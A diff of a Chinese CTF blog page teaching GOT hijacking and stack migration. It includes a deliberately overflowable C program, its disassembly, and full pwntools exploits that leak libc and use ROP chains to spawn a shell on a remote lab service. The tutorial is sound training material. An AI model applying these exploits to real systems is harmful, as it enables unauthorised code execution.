+payload = &#39;A&#39; * offset + p64(pop_rdi_ret) + p64(puts_got) + p64(gets_plt) + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(puts_plt)
+p.sendline(payload)
+p.sendline(p64(system))
+p.interactive()
+</code></pre>
+<h1 id="Stack-Migration"><a href="#Stack-Migration" class="headerlink" title="Stack Migration"></a>Stack Migration</h1><p>栈迁移（Stack Migration）是在可以输入的 ROP 链长度不够时，可以扩展输入的方法。 核心概念是将 ROP 链分别写在指定区域，然后再把栈迁移过去执行。</p>
+<p>其中为了保持栈帧平衡最重要的一条指令是 <code>leave ; ret</code>，32 位下等价于 <code>mov esp, ebp ; pop ebp</code>。</p>
+<h2 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h2><pre><code class="cpp">// gcc main.c -o main -fno-stack-protector -Wl,-z,relro,-z,now
+#include&lt;stdio.h&gt;
+void vul()
+{
+    char buf[0x20];
+    memset(buf,0,0x20);
+    read(0,buf,0x30);
+    puts(buf);
+}
+int main()
+{
+    vul();
+    return 0;
+}
+</code></pre>
+<p>源码中 buf 为 0x20 个字节，但只让读 0x30 个字节，也就是说我们只能修改 ebp 和 ret 的地址。</p>
+<h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>objdump 反汇编一下 vul 函数：</p>
+<pre><code>00000000004006a6 &lt;vul&gt;:
+  4006a6:       55                      push   rbp
+  4006a7:       48 89 e5                mov    rbp,rsp
+  4006aa:       48 83 ec 20             sub    rsp,0x20
+  4006ae:       48 8d 45 e0             lea    rax,[rbp-0x20]
+  4006b2:       ba 20 00 00 00          mov    edx,0x20
+  4006b7:       be 00 00 00 00          mov    esi,0x0
+  4006bc:       48 89 c7                mov    rdi,rax
+  4006bf:       e8 c4 fe ff ff          call   400588 &lt;_init+0x40&gt; ; memset
+  4006c4:       48 8d 45 e0             lea    rax,[rbp-0x20]
+  4006c8:       ba 30 00 00 00          mov    edx,0x30
+  4006cd:       48 89 c6                mov    rsi,rax
+  4006d0:       bf 00 00 00 00          mov    edi,0x0
+  4006d5:       b8 00 00 00 00          mov    eax,0x0
+  4006da:       e8 b1 fe ff ff          call   400590 &lt;_init+0x48&gt; ; read
+  4006df:       48 8d 45 e0             lea    rax,[rbp-0x20]
+  4006e3:       48 89 c7                mov    rdi,rax
+  4006e6:       e8 95 fe ff ff          call   400580 &lt;_init+0x38&gt; ; puts
+  4006eb:       90                      nop
+  4006ec:       c9                      leave
+  4006ed:       c3                      ret
+</code></pre><p>看到 read 其实是往 rbp-0x20 的地方读东西。那么可以想到在第一次 payload 的时候改掉 ebp，然后 ret 到 read 这个地方，于是第二次就可以读一段 rop 到我们设置的 buf 上。然后跳过去。最后一次再跳回到 A，然后往 buf 上写 <code>&quot;system(&quot;/bin/sh&quot;)&quot;</code>，再把栈搬过去就能 getshell。</p>
+<h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><pre><code class="python">#!/usr/bin/env python
+from pwn import *
+# context.log_level = &#39;debug&#39;
+context.arch = &#39;amd64&#39;
+local = 0
+if local:
+    p = process(&#39;./main&#39;)
+else:
+    p = remote(&#39;10.21.13.69&#39;, 10015)
+elf = ELF(&#39;./main&#39;)
+libc = ELF(&#39;./libc.so&#39;)
+g = lambda x: next(elf.search(asm(x)))
+leave_ret = g(&#39;leave ; ret&#39;) # 0x00000000004005ec
+pop_rdi_ret = g(&#39;pop rdi ; ret&#39;) # 0x0000000000400673
+sub_rsp_0x20 = g(&#39;sub rsp, 0x20&#39;) # 0x4005aa
+read_plt = elf.plt[&#39;read&#39;] # 0x400490
+read_got = elf.got[&#39;read&#39;] # 0x600fe8
+puts_plt = elf.plt[&#39;puts&#39;] # 0x400480
+buf = 0x00602000 - 0x100
+vul = elf.symbols[&#39;vul&#39;] # 0x4005a6
+gadget1 = 0x4006c4
+read_offset = libc.symbols[&#39;read&#39;]
+system_offset = libc.symbols[&#39;system&#39;]
+str_bin_sh_offset = next(libc.search(&#39;/bin/sh&#39;))
+# p.send(p64(0xdeadbeef).ljust(0x20,&#39;\x00&#39;))
+# gdb.attach(p)
+payload = &#39;A&#39; * 32 + p64(buf) + p64(gadget1)
+p.send(payload) # edit rbp
+payload = p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) + p64(vul) + p64(buf - 0x20 - 8) + p64(leave_ret)
+p.send(payload)
+read = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8, &#39;\x00&#39;))
+libc_base = read - read_offset
+success(&#39;libc_base = &#39; + hex(libc_base))
+system = libc_base + system_offset
+str_bin_sh = libc_base + str_bin_sh_offset
+payload = (p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)).ljust(32, &#39;\x00&#39;) + p64(buf - 0x28 - 8) + p64(leave_ret)
+p.send(payload)
+p.interactive()
+</code></pre>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/pwn/">pwn</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2019/03/17/Buffer-Overflow-with-gcc-4-9/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>Buffer Overflow with gcc&gt;=4.9</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2019/03/07/Gets一把梭/">
+                        <span>Gets一把梭</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
       </div>
-
     </div>
-    <!-- <nav id="mobile-nav">
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
   
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-    <a href="/tags" class="mobile-nav-link">Tags</a>
-  
-    <a href="/about" class="mobile-nav-link">About</a>
-  
-</nav> -->
-    <footer id="footer" class="site-footer">
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
   
 
-  <div class="clearfix container">
-      <div class="site-info">
-	      &copy; 2020 AssassinQ All Rights Reserved.
-        
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
       </div>
-      <div class="site-credit">
-        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="http://blog.b3ale.cn" target="_blank" rel="nofollow noopener"><b>Hard Work Pays Off.</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
   </div>
 </footer>
 
-
-<!-- min height -->
-
-<script>
-    var wrapdiv = document.getElementById("wrap");
-    var contentdiv = document.getElementById("content");
-
-    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
-
-
-    <!-- headerblur min height -->
-    
-      var headerblur = document.getElementById("header-blur");
-      headerblur.style.minHeight = window.getComputedStyle(document.getElementById("allheader"), null).height;
-    
-    
-</script>
-    
-<div style="display: none;">
-  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-</div>
-
-<!-- mathjax config similar to math.stackexchange -->
-
-<script type="text/x-mathjax-config">
-  MathJax.Hub.Config({
-    tex2jax: {
-      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
-      processEscapes: true
-    }
-  });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-      tex2jax: {
-        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-      }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for(i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-</script>
-
-
-  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
-  <script src="/fancybox/jquery.fancybox.pack.js"></script>
-
-
-<script src="/js/script.js"></script>
-<script src="/js/bootstrap.js"></script>
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
 
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
 
 
 
 
 
-  <div style="display: none;">
-    <script src="https://s95.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
-  </div>
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
 
 
 
 
+<!-- Plugins -->
 
 
 
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
 
-  </div>
 
-  <a id="rocket" href="#top" class=""></a>
-  <script type="text/javascript" src="/js/totop.js" async=""></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Got Hijacking and Stack Migration&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+  
+
+  
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+          tex2jax: {
+              inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+              processEscapes: true,
+              skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+          }
+      });
+
+      MathJax.Hub.Queue(function() {
+          var all = MathJax.Hub.getAllJax(), i;
+          for(i=0; i < all.length; i += 1) {
+              all[i].SourceElement().parentNode.className += ' has-jax';
+          }
+      });
+
+    </script>
+
+    <script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js?config=TeX-MML-AM_CHTML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
 <script type="text/x-mathjax-config">
   MathJax.Hub.Config("");
 </script>
@@ -373,5 +614,17 @@
 </script>
 <!-- End: Injected MathJax -->
 <!-- hexo-inject:end -->
+
+  
+
+
+
+
+
+
+
+
+
+
 </body>
 </html>
